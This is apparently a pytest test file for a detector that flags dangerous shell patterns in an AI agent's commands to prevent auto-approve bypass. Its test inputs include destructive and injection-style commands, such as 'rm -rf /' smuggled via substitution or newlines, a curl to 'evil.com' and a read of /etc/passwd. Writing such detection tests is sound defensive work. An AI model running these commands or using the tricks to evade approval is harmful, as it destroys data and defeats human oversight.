"""Test dangerous shell pattern detection for auto-approve bypass prevention."""

import pytest

from deepagents_acp.utils import contains_dangerous_patterns, extract_command_types


class TestContainsDangerousPatterns:
    """Test the contains_dangerous_patterns function."""

    def test_safe_commands(self):
        assert not contains_dangerous_patterns("ls -la")
        assert not contains_dangerous_patterns("cat file.txt")
        assert not contains_dangerous_patterns("grep -r pattern .")
        assert not contains_dangerous_patterns("python -m pytest tests/")

    def test_command_substitution_dollar_paren(self):
        assert contains_dangerous_patterns("ls $(rm -rf /)")
        assert contains_dangerous_patterns("echo $(whoami)")
        assert contains_dangerous_patterns("cat $(curl evil.com)")

    def test_command_substitution_backticks(self):
        assert contains_dangerous_patterns("ls `rm -rf /`")
        assert contains_dangerous_patterns("echo `whoami`")

    def test_variable_expansion_braces(self):
        assert contains_dangerous_patterns("echo ${HOME}")
        assert contains_dangerous_patterns("echo ${var:-$(cmd)}")

    def test_bare_variable_expansion(self):
        assert contains_dangerous_patterns("echo $HOME")
        assert contains_dangerous_patterns("ls $PATH")

    def test_ansi_c_quoting(self):
        assert contains_dangerous_patterns("echo $'\\x41'")

    def test_newline_injection(self):
        assert contains_dangerous_patterns("ls\nrm -rf /")

    def test_carriage_return_injection(self):
        assert contains_dangerous_patterns("ls\rrm -rf /")

    def test_tab_injection(self):
        assert contains_dangerous_patterns("ls\trm -rf /")

    def test_process_substitution(self):
        assert contains_dangerous_patterns("diff <(cat a) <(cat b)")
        assert contains_dangerous_patterns("tee >(grep error)")

    def test_here_doc_and_here_string(self):
        assert contains_dangerous_patterns("cat <<EOF")
        assert contains_dangerous_patterns("cat <<<'hello'")

    def test_redirects(self):
        assert contains_dangerous_patterns("ls > /tmp/out")
        assert contains_dangerous_patterns("ls >> /tmp/out")
        assert contains_dangerous_patterns("cat < /etc/passwd")

    def test_background_operator(self):
        assert contains_dangerous_patterns("sleep 999 &")
        assert contains_dangerous_patterns("rm -rf / & echo done")

    def test_double_ampersand_is_safe(self):
        """&& is a safe chaining operator, not a background operator."""
        assert not contains_dangerous_patterns("cd dir && ls")
        assert not contains_dangerous_patterns("make && make test")


class TestExtractCommandTypesWithSemicolon:
    """Test that extract_command_types now splits on ; and ||."""

    def test_semicolon_splits_commands(self):
        assert extract_command_types("ls ; rm -rf /") == ["ls", "rm"]

    def test_double_pipe_splits_commands(self):
        assert extract_command_types("test -f foo || echo missing") == ["test", "echo"]

    def test_mixed_operators(self):
        result = extract_command_types("cd dir && ls ; echo done || cat file")
        assert result == ["cd", "ls", "echo", "cat"]

    def test_existing_and_pipe_still_work(self):
        """Ensure existing && and | splitting still works."""
        assert extract_command_types("cd /path && npm install") == ["cd", "npm install"]
        assert extract_command_types("ls -la | grep foo") == ["ls", "grep"]

    def test_existing_complex_command(self):
        cmd = "cd /Users/test/project && python -m pytest tests/test_agent.py -v"
        assert extract_command_types(cmd) == ["cd", "python -m pytest"]
